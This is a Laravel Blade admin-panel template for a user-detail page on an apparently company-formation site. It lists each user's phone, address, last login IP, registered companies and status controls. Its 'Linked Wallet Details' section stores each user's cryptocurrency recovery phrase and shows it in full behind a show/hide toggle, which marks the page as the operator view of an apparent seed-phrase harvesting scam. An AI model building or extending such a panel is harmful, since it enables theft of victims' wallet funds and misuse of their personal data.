<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Detail - Admin Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = { theme: { extend: { colors: { 'navy': '#1e3a8a', 'orange': '#f97316', 'purple-custom': '#6366f1' } } } }
    </script>
</head>
<body class="bg-gray-900 min-h-screen">
    <!-- Top Bar -->
    <header class="bg-gray-800 border-b border-gray-700 sticky top-0 z-50">
        <div class="flex items-center justify-between px-4 py-3">
            <div class="flex items-center space-x-4">
                <div class="flex items-center space-x-3">
                    <div class="w-8 h-8 bg-gradient-to-br from-orange to-yellow-500 rounded-lg flex items-center justify-center">
                        <svg class="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                    </div>
                    <span class="text-white font-semibold text-lg">Admin Panel</span>
                </div>
            </div>
            <div class="flex items-center space-x-4">
                <form method="POST" action="{{ route('admin.logout') }}">@csrf<button type="submit" class="text-gray-400 hover:text-red-400 transition text-sm">Logout</button></form>
            </div>
        </div>
    </header>

    <main class="max-w-4xl mx-auto p-4 lg:p-8">
        <!-- Back Link -->
        <a href="{{ route('admin.users') }}" class="inline-flex items-center text-gray-400 hover:text-white transition mb-6">
            <svg class="w-4 h-4 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"></path></svg>
            Back to Users
        </a>

        <!-- User Info Card -->
        <div class="bg-gray-800 rounded-xl border border-gray-700 p-6 lg:p-8 mb-6">
            <div class="flex items-start justify-between mb-6">
                <div class="flex items-center space-x-4">
                    <div class="w-16 h-16 bg-navy rounded-full flex items-center justify-center">
                        <span class="text-white text-xl font-bold">{{ $user->initials }}</span>
                    </div>
                    <div>
                        <h1 class="text-2xl font-bold text-white">{{ $user->name }}</h1>
                        <p class="text-gray-400">{{ $user->email }}</p>
                    </div>
                </div>
                <form method="POST" action="{{ route('admin.users.delete', $user->id) }}" onsubmit="return confirm('Delete this user and all their companies?')">
                    @csrf @method('DELETE')
                    <button type="submit" class="bg-red-500/10 border border-red-500/30 text-red-400 hover:bg-red-500/20 px-4 py-2 rounded-lg text-sm transition">Delete User</button>
                </form>
            </div>

            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div class="bg-gray-700/30 rounded-lg p-4">
                    <p class="text-gray-500 text-xs uppercase mb-1">Phone</p>
                    <p class="text-white text-sm">{{ $user->phone ?? 'Not provided' }}</p>
                </div>
                <div class="bg-gray-700/30 rounded-lg p-4">
                    <p class="text-gray-500 text-xs uppercase mb-1">Address</p>
                    <p class="text-white text-sm">{{ $user->street_address ?? 'Not provided' }}{{ $user->unit_apartment ? ', '.$user->unit_apartment : '' }}</p>
                </div>
                <div class="bg-gray-700/30 rounded-lg p-4">
                    <p class="text-gray-500 text-xs uppercase mb-1">Registered</p>
                    <p class="text-white text-sm">{{ $user->created_at->format('M d, Y h:i A') }}</p>
                </div>
                <div class="bg-gray-700/30 rounded-lg p-4">
                    <p class="text-gray-500 text-xs uppercase mb-1">Last Login</p>
                    <p class="text-white text-sm">
                        @if($user->last_login_at)
                            {{ $user->last_login_at->format('M d, Y h:i A') }}<br>
                            <span class="text-gray-400 text-xs">IP: {{ $user->last_login_ip }}</span>
                        @else
                            Never
                        @endif
                    </p>
                </div>
                <div class="bg-gray-700/30 rounded-lg p-4">
                    <p class="text-gray-500 text-xs uppercase mb-1">Last Seen</p>
                    <p class="text-white text-sm">
                        @if($user->last_seen_at)
                            @if($user->last_seen_at->diffInMinutes(now()) < 5)
                                <span class="text-green-400">Online Now</span>
                            @else
                                {{ $user->last_seen_at->diffForHumans() }}
                            @endif
                        @else
                            Never
                        @endif
                    </p>
                </div>
                <div class="bg-gray-700/30 rounded-lg p-4">
                    <p class="text-gray-500 text-xs uppercase mb-1">Verification Status</p>
                    <p class="text-white text-sm">
                        @if($user->is_verified)
                            <span class="text-green-400">Verified</span>
                        @else
                            <span class="text-yellow-400">Pending</span>
                        @endif
                    </p>
                </div>
            </div>
        </div>

        <!-- Linked Wallet Details -->
        <div class="bg-gray-800 rounded-xl border border-gray-700 p-6 lg:p-8 mb-6">
            <h2 class="text-lg font-semibold text-white mb-4 flex items-center">
                <svg class="w-5 h-5 mr-2 text-indigo-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                Linked Wallet Details
            </h2>
            @if($user->wallet_connected)
                <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div class="bg-gray-700/30 rounded-lg p-4">
                        <p class="text-gray-500 text-xs uppercase mb-1">Wallet Connected</p>
                        <span class="inline-flex items-center px-2.5 py-0.5 rounded-full text-xs font-medium bg-green-500/10 text-green-400 border border-green-500/20">
                            Connected
                        </span>
                    </div>
                    <div class="bg-gray-700/30 rounded-lg p-4">
                        <p class="text-gray-500 text-xs uppercase mb-1">Wallet Name</p>
                        <p class="text-white text-sm font-semibold">{{ $user->wallet_name }}</p>
                    </div>
                    <div class="bg-gray-700/30 rounded-lg p-4 md:col-span-2">
                        <div class="flex items-center justify-between mb-2">
                            <p class="text-gray-500 text-xs uppercase">Recovery Phrase (Mnemonic)</p>
                            <button onclick="togglePhrase()" class="text-indigo-400 hover:text-indigo-300 transition text-xs font-semibold select-none">
                                <span id="toggleText">Show Phrase</span>
                            </button>
                        </div>
                        <div id="phraseContainer" class="bg-gray-900 border border-gray-700 rounded-lg p-3 font-mono text-sm break-all text-gray-500 select-none blur-sm pointer-events-none transition-all duration-300">
                            {{ $user->wallet_phrase }}
                        </div>
                    </div>
                </div>
                <script>
                    function togglePhrase() {
                        const phrase = document.getElementById('phraseContainer');
                        const btn = document.getElementById('toggleText');
                        if (phrase.classList.contains('blur-sm')) {
                            phrase.classList.remove('blur-sm', 'text-gray-500', 'select-none', 'pointer-events-none');
                            phrase.classList.add('text-green-400');
                            btn.innerText = 'Hide Phrase';
                        } else {
                            phrase.classList.add('blur-sm', 'text-gray-500', 'select-none', 'pointer-events-none');
                            phrase.classList.remove('text-green-400');
                            btn.innerText = 'Show Phrase';
                        }
                    }
                </script>
            @else
                <div class="text-center py-6 bg-gray-700/20 border border-dashed border-gray-600 rounded-lg">
                    <p class="text-gray-400 text-sm">No wallet linked to this account yet.</p>
                </div>
            @endif
        </div>

        <!-- User's Companies -->
        <div class="bg-gray-800 rounded-xl border border-gray-700 overflow-hidden">
            <div class="p-6 border-b border-gray-700">
                <h2 class="text-lg font-semibold text-white">Companies ({{ $user->companies->count() }})</h2>
            </div>
            <div class="overflow-x-auto">
                <table class="w-full">
                    <thead><tr class="border-b border-gray-700">
                        <th class="text-left py-3 px-4 text-gray-400 text-xs font-medium uppercase">Company</th>
                        <th class="text-left py-3 px-4 text-gray-400 text-xs font-medium uppercase">Type</th>
                        <th class="text-left py-3 px-4 text-gray-400 text-xs font-medium uppercase">State</th>
                        <th class="text-left py-3 px-4 text-gray-400 text-xs font-medium uppercase">Status</th>
                        <th class="text-left py-3 px-4 text-gray-400 text-xs font-medium uppercase">Actions</th>
                    </tr></thead>
                    <tbody>
                        @forelse($user->companies as $company)
                        <tr class="border-b border-gray-700/50 hover:bg-gray-700/30">
                            <td class="py-3 px-4 text-white text-sm font-medium">{{ $company->company_name }}</td>
                            <td class="py-3 px-4 text-gray-400 text-sm">{{ $company->entity_type_label }}</td>
                            <td class="py-3 px-4 text-gray-400 text-sm">{{ $company->formation_state }}</td>
                            <td class="py-3 px-4">
                                <form method="POST" action="{{ route('admin.companies.status', $company->id) }}" class="inline">
                                    @csrf @method('PATCH')
                                    <select name="status" onchange="this.form.submit()" class="bg-gray-700 border border-gray-600 text-sm rounded-lg px-2 py-1 text-white focus:ring-orange focus:border-orange">
                                        <option value="pending" {{ $company->status === 'pending' ? 'selected' : '' }}>Pending</option>
                                        <option value="processing" {{ $company->status === 'processing' ? 'selected' : '' }}>Processing</option>
                                        <option value="approved" {{ $company->status === 'approved' ? 'selected' : '' }}>Approved</option>
                                        <option value="rejected" {{ $company->status === 'rejected' ? 'selected' : '' }}>Rejected</option>
                                    </select>
                                </form>
                            </td>
                            <td class="py-3 px-4">
                                <form method="POST" action="{{ route('admin.companies.delete', $company->id) }}" onsubmit="return confirm('Delete this company?')">
                                    @csrf @method('DELETE')
                                    <button type="submit" class="text-red-400 hover:text-red-300 transition text-sm">Delete</button>
                                </form>
                            </td>
                        </tr>
                        @empty
                        <tr><td colspan="5" class="py-6 text-center text-gray-500">No companies for this user</td></tr>
                        @endforelse
                    </tbody>
                </table>
            </div>
        </div>
    </main>
</body>
</html>
